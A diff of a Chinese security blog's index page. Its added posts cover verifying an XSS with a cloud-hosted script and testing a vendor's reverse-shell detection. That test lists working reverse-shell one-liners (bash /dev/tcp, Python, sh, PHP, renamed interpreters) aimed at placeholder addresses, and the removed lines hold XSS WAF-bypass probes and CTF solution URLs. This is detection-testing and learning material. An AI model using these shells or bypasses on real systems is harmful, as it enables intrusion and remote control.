@@ -115,7 +115,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-count">44</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -158,7 +158,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%94%A8strace%E5%AE%9A%E4%BD%8Dbug/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E6%8F%90%E9%AB%98%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E6%95%88%E7%8E%87%E7%9A%84%E5%B7%A5%E5%85%B7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -171,7 +171,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E7%94%A8strace%E5%AE%9A%E4%BD%8Dbug/" class="post-title-link" itemprop="url">用strace定位bug</a>
+          <a href="/2021-12-26-%E6%8F%90%E9%AB%98%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E6%95%88%E7%8E%87%E7%9A%84%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">提高漏洞验证效率的工具</a>
         </h2>
 
         <div class="post-meta-container">
@@ -195,36 +195,37 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>今年年初(<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/mp/profile_ext?action=home&__biz=MzkzMzI3OTczNA==&scene=124#wechat_redirect">2021年我的学习计划</a>)我就计划补一下”操作系统”这门计算机专业课.</p>
-<p>最近我就在学一门网课，是极客时间的<a target="_blank" rel="noopener" href="https://time.geekbang.org/column/intro/100078401?tab=catalog">操作系统实战 45 讲</a>，感觉还可以：代码量是1w行多点，课程我就把它当做一个45讲的代码说明文档。</p>
-<p>网上也有一些类似的”实验教学”，比如：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/chyyuu/os_kernel_lab">kernel实验</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/sunym1993/flash-linux0.11-talk">linux0.11内核解读</a></li>
-<li><a target="_blank" rel="noopener" href="https://reactos.org/">reactos-操作系统</a></li>
-</ul>
-<p>目前我学习<a target="_blank" rel="noopener" href="https://gitee.com/lmos/cosmos">操作系统实战</a>有两个学习目标：</p>
-<ul>
-<li>完全理解<a target="_blank" rel="noopener" href="https://gitee.com/lmos/cosmos/tree/master/lesson13/Cosmos">第十三课的代码</a>：十三课之前的内容包括了整个机器初始化过程</li>
-<li>完全理解<a target="_blank" rel="noopener" href="https://gitee.com/lmos/cosmos/tree/master/lesson25~26/Cosmos">第二十六课的代码</a>：比”十三课”内容多了”进程”和”内存”</li>
-</ul>
-<p>本文记录我在学习时遇到的第一个小问题：编译”第十三课的代码”时遇到一个报错</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/141682853-e5976402-09ba-4478-aae6-4406e44c7dc3.png" alt="image"></p>
-<p>问题解决思路：</p>
-<ul>
-<li>搞清楚”编译器”去哪里找”kernel.inc”文件</li>
-</ul>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>最简便的方法找到”kernel.inc”文件位置</p>
-<p>strace -f可以跟踪子进程的系统调用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp Cosmos]# strace -f make 2&gt;&#x2F;tmp&#x2F;q.txt</span><br><span class="line">[root@instance-fj5pftdp Cosmos]# cat &#x2F;tmp&#x2F;q.txt</span><br><span class="line">...</span><br><span class="line">[pid 20451] open(&quot;kernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;includekernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;bastypeinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;halinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;knlinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;libinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;drvinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] write(2, &quot;..&#x2F;hal&#x2F;x86&#x2F;kernel.asm:6: &quot;, 25..&#x2F;hal&#x2F;x86&#x2F;kernel.asm:6: ) &#x3D; 25</span><br></pre></td></tr></table></figure>
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>某个xss漏洞点如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">x&#x3D;document.createElement(&quot;script&quot;);</span><br><span class="line">x.setAttribute(&quot;src&quot;, &quot;用户可控的地址&quot;);</span><br><span class="line">document.body.appendChild(x);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
 
-<p>可以发现 <code>../includekernel.inc</code>等路径少了一个<code>/</code>符号</p>
-<p>修改后，就编译成功了</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/141683341-8053e5e0-850c-437f-9105-94ae1a4809fe.png" alt="image"></p>
-</li>
+<p>虽然xss漏洞肯定是存在的，但是我不知道利用起来是不是会有问题，比如碰到csp等。</p>
+<p>所以我在”用户可控地址” 填入 “<a target="_blank" rel="noopener" href="http://x.x.x.x/1.js&quot;">http://x.x.x.x/1.js&quot;</a> 来验证，于是出现了点问题。</p>
+<p>第一个问题：https站点引入http静态资源时，浏览器控制台出现”混合内容”警告。似乎会影响js解析</p>
+<p>第二个问题：响应头的content-type需要是text/javascript，否则不能当作js解析</p>
+<p>所以我需要一个web服务：</p>
+<ul>
+<li>支持https</li>
+<li>返回内容可以自定义</li>
+<li>响应头content-type可以自定义</li>
+<li>支持公网访问</li>
 </ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><code>strace -f</code> 真香：不需要我去研究”代码”或者”编译器”是怎么包含”kernel.inc文件”。</p>
+<p>自己去搭这样一个服务也不难，但是如果有现成的岂不是更好，省时省力。</p>
+<p>根据历史经验，我知道有两种平台似乎可以解决我的这个小需求：</p>
+<ul>
+<li>类似 pastebin 的平台，可以通过短链接访问</li>
+<li>xss平台</li>
+</ul>
+<h1 id="测试这些平台是否好用"><a href="#测试这些平台是否好用" class="headerlink" title="测试这些平台是否好用"></a>测试这些平台是否好用</h1><p><a target="_blank" rel="noopener" href="http://ix.io/">http://ix.io</a> : 不支持https</p>
+<p><a target="_blank" rel="noopener" href="http://pastebin.com/">http://pastebin.com</a>: 不支持设置content-type</p>
+<p>搜索到的很多xss平台，都需要邀请码。甚至有的注册成功了，但是使用起来有问题。</p>
+<p>再比如 xssye.com 这个xss平台我很久以前用过。今天登陆提示账号密码登陆不上，申请密码找回提示邮箱和账号对不上，重新注册又提示”需要注册邀请码”。</p>
+<p>总之试了几个，感觉用着比较难受。这些xss平台看前段页面似乎都是一套代码，也不确定是否可能存在漏洞。</p>
+<h1 id="有没有稳定好用的服务"><a href="#有没有稳定好用的服务" class="headerlink" title="有没有稳定好用的服务"></a>有没有稳定好用的服务</h1><p>想起来云上的文件存储服务，刚好是满足我自己的需求的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl https:&#x2F;&#x2F;webbackup-3knjfg4bxz.bj.bcebos.com&#x2F;1.js</span><br><span class="line">alert(1);</span><br></pre></td></tr></table></figure>
+
+<p>另外云上的函数服务，还可以写代码对响应做更精细的控制。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>云上的 文件存储、函数服务 等很适合快速在公网提供https服务，而且相对于个人自己搭建的服务要稳定省心得多，推荐使用。</p>
+<p>当然云上也有很坑的服务，就不说了。</p>
 
       
     </div>
@@ -251,7 +252,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(1)/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E6%9F%90%E5%8E%82%E5%95%86%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E9%98%B2%E6%8A%A4%E8%83%BD%E5%8A%9B%E6%B5%8B%E8%AF%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -264,7 +265,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(1)/" class="post-title-link" itemprop="url">细品某语义waf的xss防护(1)</a>
+          <a href="/2021-12-26-%E6%9F%90%E5%8E%82%E5%95%86%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E9%98%B2%E6%8A%A4%E8%83%BD%E5%8A%9B%E6%B5%8B%E8%AF%95/" class="post-title-link" itemprop="url">某厂商的反弹shell防护能力测试</a>
         </h2>
 
         <div class="post-meta-container">
@@ -288,124 +289,48 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>假设攻击场景如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xss漏洞输出位置如下:</span><br><span class="line"></span><br><span class="line">  &lt;div&gt;用户输出可控位置&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">攻击者准备利用on事件来执行js,比如</span><br><span class="line"></span><br><span class="line">  &lt;div&gt;&lt;svg onload&#x3D;&quot;alert(&#39;xss&#39;);&quot;&gt;&lt;&#x2F;div&gt;   利用onload属性</span><br></pre></td></tr></table></figure>
-
-<p>验证在这个场景下厂商的安全防护策略</p>
-<p>分析思路：</p>
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>工作任务需要测试某厂商的反弹shell检测安全能力</p>
+<p>测试思路：</p>
 <ol>
-<li>改变payload，根据拦截情况推测安全防护策略</li>
-</ol>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;  不拦截</span><br><span class="line">a&#x3D;&lt;img&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;  拦截</span><br></pre></td></tr></table></figure>
-<p>说明区分了认识的标签和不认识的标签</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;a&#x3D;&lt;div&#x2F;oxx&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;&#39;    不拦截</span><br><span class="line">&#39;a&#x3D;&lt;div&#x2F;onxx&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;&#39;   拦截</span><br></pre></td></tr></table></figure>
-<p>拦截on事件，只要以on开头就拦截</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa(&#39;&#39;;&quot;&gt;   on属性值中少一个右括号就不拦截，说明判断js语法是否正确</span><br><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa(&#39;&#39;);&quot;&gt;   拦截</span><br><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa;&quot;&gt;   不拦截</span><br></pre></td></tr></table></figure>
-<p>未知标签 &amp;&amp; on事件 &amp;&amp; 解析on属性中js &amp;&amp; on属性中调用了函数   则拦截</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;xxx&#x2F;onxxx&#x3D;a();&gt;     不拦截</span><br><span class="line">a&#x3D;&lt;xxx&#x2F;onxxx&#x3D;xxxxx;a();&gt;   拦截</span><br></pre></td></tr></table></figure>
-<p>on属性值需要大于一定长度</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;img&#x2F;onxxxx&#x3D;&quot;aaa&quot;&gt;  不拦截</span><br><span class="line"></span><br><span class="line">a&#x3D;&lt;img&#x2F;onxxxx&#x3D;&quot;aaaaaaa&quot;&gt;   拦截</span><br></pre></td></tr></table></figure>
-<p>已知标签on属性值大于一定长度则拦截</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>存在HTML解析和JS解析</p>
-<p>安全防护策略可能是：</p>
-<ul>
-<li>HTML解析 &amp;&amp; 未知标签 &amp;&amp; on事件 &amp;&amp; on属性值大于一定长度 &amp;&amp; 对on属性值做JS解析 &amp;&amp; on属性中调用了函数   则拦截</li>
-<li>HTML解析 &amp;&amp; 已知标签 &amp;&amp; on事件 &amp;&amp; on属性值大于一定长度  则拦截</li>
+<li>挑选测试样本<ul>
+<li>每一种检测策略挑选对应的1-3个样本</li>
 </ul>
+</li>
+<li>测试过程中<ul>
+<li>如果某一类样本中的任意一个样本未通过测试，就不继续测试同类其他样本</li>
+<li>如果某一类样本完全被拦截，就尝试绕过</li>
+</ul>
+</li>
+</ol>
+<p>测试时需要注意下面的点，可能会影响测试结果</p>
+<ul>
+<li>反弹shell后，是否输入命令</li>
+</ul>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="挑选测试样本"><a href="#挑选测试样本" class="headerlink" title="挑选测试样本"></a>挑选测试样本</h2><p>按照<code>安全项目/HIDS/业务：入侵检测/反弹shell/3.反弹shell检测.md</code>学习的检测策略，每一种检测策略挑选对应的1-3个样本。</p>
+<ol>
+<li><p>bash进程、默认文件描述符指向socket</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>没有bash进程、默认文件描述符不指向socket</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(\&quot;import socket, subprocess;s &#x3D; socket.socket();s.connect((&#39;127.0.0.1&#39;,2222))\nwhile 1:  proc &#x3D; subprocess.Popen(s.recv(1024), stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE,shell&#x3D;True);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>对抗行为（使用其他sh解释器）</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,4242);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>对抗行为（修改sh解释器名称）</p>
+<p>   修改bash、sh</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;bin&#x2F;bash &#x2F;usr&#x2F;bin&#x2F;x; x -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1      &#x2F;&#x2F; x是bash</span><br><span class="line"></span><br><span class="line">cp &#x2F;usr&#x2F;bin&#x2F;sh &#x2F;usr&#x2F;bin&#x2F;y; 0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;4242; y &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196  &#x2F;&#x2F; y是sh</span><br></pre></td></tr></table></figure>
 
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%A5%9E%E5%A5%87%E7%9A%84javascript-%E4%B8%8D%E7%94%A8%E6%8B%AC%E5%8F%B7%E5%B8%A6%E5%8F%82%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E7%A5%9E%E5%A5%87%E7%9A%84javascript-%E4%B8%8D%E7%94%A8%E6%8B%AC%E5%8F%B7%E5%B8%A6%E5%8F%82%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">神奇的javascript-不用括号带参执行函数</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>两周前，我遇到一个挺有意思的xss，过滤了很多符号，包括<code>&lt;&gt;=()`[]</code>等。</p>
-<p>我将此问题抽象成<a target="_blank" rel="noopener" href="https://04bdb3a0.o53.xyz/a1e60ae3-4bac-4012-a0f3-5b7018677979.php?a=1">ctf题目</a>，题目源码公开在 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/40fcaed60727b6163b034145e332640f">github</a>。</p>
-<p>前两天在 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/40fcaed60727b6163b034145e332640f">题目评论</a> 中看到有师傅把答案贴出来了，我就说一下这个案例。</p>
-<h1 id="测试时遇到的问题"><a href="#测试时遇到的问题" class="headerlink" title="测试时遇到的问题"></a>测试时遇到的问题</h1><p>实际测试时遇到的问题，也是题目中有两个比较难的地方：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* javascript不用 &lt;&gt;&#x3D;()&#96;[] 等符号，怎么调用函数？</span><br><span class="line">* javascript不用 &lt;&gt;&#x3D;()&#96;[] 等符号，怎么调用函数，并且带上参数？</span><br></pre></td></tr></table></figure>
-
-<p>第一个问题简单一点：在发生类型转换时，会执行valueOf或者toString属性值指向的函数。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1-&#123;valueOf:function()&#123;alert(1)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>第二个问题难一点，需要对this的用法比较熟悉。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在函数外部,this指向window对象</span><br><span class="line"></span><br><span class="line">在函数内部：</span><br><span class="line"></span><br><span class="line">* 普通调用时</span><br><span class="line">  * strict模式下，this指向undeined</span><br><span class="line">  * 非strict模式下，this指向当前对象</span><br></pre></td></tr></table></figure>
-
-<p>还有一些方式改变this指向的对象，包括：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 调用call函数、apply函数等指定对象</span><br><span class="line">* new构造函数</span><br></pre></td></tr></table></figure>
-
-<p>this涉及的情况比较多，也比较反直觉，这里就不多说了。可以看 <a target="_blank" rel="noopener" href="https://time.geekbang.org/column/article/113399">11 | this：从JavaScript执行上下文的视角讲清楚this</a> 这篇文章。</p>
-<h1 id="题目解法"><a href="#题目解法" class="headerlink" title="题目解法"></a>题目解法</h1><p>我的解法和 @rmb122 师傅一样：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;04bdb3a0.o53.xyz&#x2F;a1e60ae3-4bac-4012-a0f3-5b7018677979.php?a&#x3D;xx%27-&#123;valueOf:test.a,%27call%27:%22%27%22%2blocation.hash&#125;-%27#&#39;;hello(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>我也把题目发给我做前端开发的朋友，他的解法如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;04bdb3a0.o53.xyz&#x2F;a1e60ae3-4bac-4012-a0f3-5b7018677979.php?a&#x3D;%27%2B&#123;toString:%20test.a,call:%20%27hello%27%2B[...hello%2B%27%27][29]%2B%22%27a%27,%22%2B%22%27b%27,%22%2B%22%27c%27%22%2B[...hello%2B%27%27][56]&#125;%2B%27</span><br></pre></td></tr></table></figure>
-
-<p>中间有个小插曲：在朋友把他的解法发我后，我在代码中添加了对[]符号的过滤，因为我碰到的实际案例中也过滤了[]符号。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然当时绕过了xss的过滤，也清楚触发流程，但是我不明白为什么会这么触发。</p>
-<p>所以补了一下和此题相关的语法及概念，包括以下内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 类型转换</span><br><span class="line">* this是什么</span><br><span class="line">* 函数是一等公民</span><br></pre></td></tr></table></figure>
-
-<p>由这个问题想到，是否其他语言有类似场景？比如某个对象可控时，对它做运算会导致函数调用。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">obj &#x3D; &#123;&quot;可控key&quot;:&quot;可控value&quot;&#125;</span><br><span class="line"></span><br><span class="line">操作 obj</span><br></pre></td></tr></table></figure>
-
-<p>这是一个木有答案的问题。</p>
+</li>
+</ol>
+<h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p>1 通过</p>
+<p>2、3、4 不通过</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>  4类样本中，仅检测出1类最基础的反弹shell。</p>
+<p>  在测试过程中发现：</p>
+<ul>
+<li>检测到反弹shell后不会立马告警：厂商会检测shell是否执行命令，如果仅仅反弹shell但是没有执行命令就不会被拦截</li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">Reverse Shell Cheat Sheet</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/263684.html">云上威胁检测 | 详解反弹shell多维检测技术</a></p>
 
       
     </div>
@@ -542,7 +467,7 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%BD%93%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E9%81%87%E5%88%B0%E9%98%B2%E7%81%AB%E5%A2%99/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%94%A8strace%E5%AE%9A%E4%BD%8Dbug/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -555,7 +480,7 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%BD%93%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E9%81%87%E5%88%B0%E9%98%B2%E7%81%AB%E5%A2%99/" class="post-title-link" itemprop="url">当端口扫描遇到防火墙</a>
+          <a href="/2021-12-26-%E7%94%A8strace%E5%AE%9A%E4%BD%8Dbug/" class="post-title-link" itemprop="url">用strace定位bug</a>
         </h2>
 
         <div class="post-meta-container">
@@ -579,195 +504,36 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/yLtUKN9fJrQD0P63Ghkv7w">为什么masscan扫描快(1)?</a> 里，我提到之前端口扫描时遇到过很严重的误报：”端口扫描结果中发现有的ip开放了5000+个端口，并且端口上似乎没有什么业务。”。</p>
-<p>写完上篇文章后，后台收到一个读者留言说他也遇到过这样的ip。ip是国外的一个垃圾站点，下文中我以”x.x.x.x”代替这个ip。</p>
-<p>“x.x.x.x”使用<code>masscan x.x.x.x -p 1-65535 --rate 4000</code>时，结果中确实显示大量开放端口。</p>
-<p>为了验证这些端口是否真的开放，我使用<code>echo 111 | nc x.x.x.x 28328</code>命令验证(28328是masscan判定为开放的端口)，并同时tcpdump抓包，如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# tcpdump &quot;host x.x.x.x&quot;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 第一次执行 echo 111 | nc  x.x.x.x 28328</span><br><span class="line">23:59:20.635538 IP instance-fj5pftdp.34796 &gt; x.x.x.x.11935: Flags [S], seq 1688099017, win 27200, options [mss 1360,sackOK,TS val 2944989102 ecr 0,nop,wscale 7], length 0</span><br><span class="line">23:59:20.670753 IP x.x.x.x.11935 &gt; instance-fj5pftdp.34796: Flags [S.], seq 3942687481, ack 1688099018, win 14600, options [mss 1460,nop,wscale 7,nop,nop,sackOK], length 0</span><br><span class="line">23:59:20.670859 IP instance-fj5pftdp.34796 &gt; x.x.x.x.11935: Flags [.], ack 1, win 213, length 0</span><br><span class="line">23:59:20.671028 IP instance-fj5pftdp.34796 &gt; x.x.x.x.11935: Flags [P.], seq 